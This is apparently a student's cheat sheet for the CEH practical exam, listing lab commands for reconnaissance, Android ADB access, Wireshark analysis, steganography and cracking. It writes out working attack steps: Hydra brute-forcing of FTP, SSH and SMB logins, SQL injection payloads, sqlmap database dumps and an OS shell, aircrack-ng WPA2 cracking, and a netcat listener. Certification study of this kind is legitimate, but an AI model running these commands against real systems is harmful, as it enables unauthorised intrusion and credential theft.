# CEH
Everything you need to Know

**FQDN**
nmap -A 10.10.1.1/24
Do the Nmap scan for the 10.10.1.1/24 for the FQDN, Then search FQDN.

**Android**
The command you've provided, "adb connect ip:5555," is used to connect an Android device to your computer over the Android Debug Bridge (ADB) via a specified IP address and port (5555 in this case). This command is typically used when you want to connect to an Android device wirelessly.
CMD: 
1: adb connect ip:5555
2: adb shell
(you may see in sd or down)
3: adb pull name/of/dir (if you stuck use sudo -i)
4: install ent (apt install ent)
5: ent file.elf (check all the elf file and choose a highest value)
6: sha384sum file.elf (highest entropy value file)

The command you've provided, "adb connect ip:5555," is used to connect an Android device to your computer over the Android Debug Bridge (ADB) via a specified IP address and port (5555 in this case). This command is typically used when you want to connect to an Android device wirelessly. CMD: step1: adb connect ip:5555 step2: adb shell

ftp
hydra -L user.txt -P pass.txt ftp://ip
to connect CMD: ftp ip
CMD: get file name (to download the file to view)

**SSH**
hydra -L uesr.txt -P pass.txt IP ssh
ssh usernmae@ip (or) ssh username@ip:22 (or) ssh usernmae@ip -p port

analyze a IOT file 
filter it as MQTT
CMD: mqtt
in info Go to publish message
then go to a MQ Telemtry transport protocol
here we go we got the msg len

Find for nmap ssh port open 
nmap -sV -p 22 ip/24
connect to ssh port 
CMD : ssh username@ip
enter the password

sudo -l (look for for checking permission) its not important

hydra -L user.txt -P pass.txt ip smb
smbclient -U username -L ip
smbclient -U username \\\\ip\\disk name
dir (or) ls
cd 
get filename


BCTextEncoder

**Zaproxy**

1- Auth Bypass-  hi'OR 1=1 --
2- Insert new details if sql injection found in login page in username tab enter- blah';insert into login values('john','apple123');--
3- Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write -  document.cookie
Then copy the cookie value that was presented after this command. Then go to terminal and type this command,
sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --dbs
4- Command to check tables of database retrieved-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables
5- Select the table you want to dump-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)
6- For OS shell this is the command-   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
6.1 In the shell type-   TASKLIST  (to view the tasks)
6.2 Use systeminfo for windows to get all os version
6.3 Use uname -a for linux to get os version

**SQL CMD:**
login and view profile 
inspect document.cookie
sqlmap -u "URL" --cookie="cooke value" --dbs
sqlmap -u "URL" --cookie="cooke value" -D databasename --tables
sqlmap -u "URL" --cookie="cooke value" -D databasename -T table name --dump

sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs   (databases)
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart –tables   (tables)
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users --columns   (columns)
(dump whole table)
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users  --dump 
 OR 
(dump individual  column data)
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname  --dump 
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C pass  --dump

 **openstego** 
    (or)
1- Hide Data Using Whitespace Stegnography- snow -C -m "My swiss account number is 121212121212" -p "magic" readme.txt readme2.txt  (magic is password and your secret is stored in readme2.txt along with the content of readme.txt)
2- To Display Hidden Data- snow -C -p "magic" readme2.txt (then it will show the content of readme2.txt content)
3- Image Stegnography using Openstego- PRACTICE ??

**VeraCrypt**
open veracrypt 
select any volume 
then select a veracrypt file in the select file options
and then mount 
enter the password given (use the crack station to crack)

**Cracking Wifi Password**
aircrack-ng [pcap file] (For cracking WEP network)
after this you can see a BSSID
aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file] (For cracking WPA2 or other networks through the captured .pcap file)

1. aircrack-ng file.cap

aircrack-ng -a2 -b BSSID -w password.txt pcap file

2. aircrack-ng file.cap -w password.txt

(DDoS) tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given
(DoS) tcp.flags.syn == 1   (Which machine for dos)
http.request.method == POST   (for passwords) or click tools ---> credentials
Also



**CREDENTIALS** 

To find a login credentials username and passsword 
open the given file in wireshark 
http.request.method == POST   (for passwords) or click tools ---> credentials
go to hypertext transfer protocol 
at the end you can find here we go boom

**DoS**

Go to statistics 
IPv4 addresses
Source and Destination
Then you can apply the filter given
tcp.flags.syn == 1 and tcp.flags.ack == 0 (hint hights count)

**DDoS**

tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given
tcp.flags.syn == 1   (Which machine for dos)
http.request.method == POST   (for passwords) or click tools ---> credentials

find / -type f -perm -4000 2>/dev/null
gunzip /usr/share/wordlists/rockyou.txt.gz
unzip file.zip
fcrackzip file.zip
nc -lvnp port
find . -name flag.txt
gobuster dir -u http://ip -w wordlist
C:\> D:
D:\>
cd /d D:\Your\Desired\Directory



Domain user account 
login rdp (username and pass will be given)
cmd :net user

cryp-tool ECB(.hex) format FTP

oprn cryptool
Encrypt/Decrypt
symmetric (morden)
DES (ECB)
can can get the ftp credintial
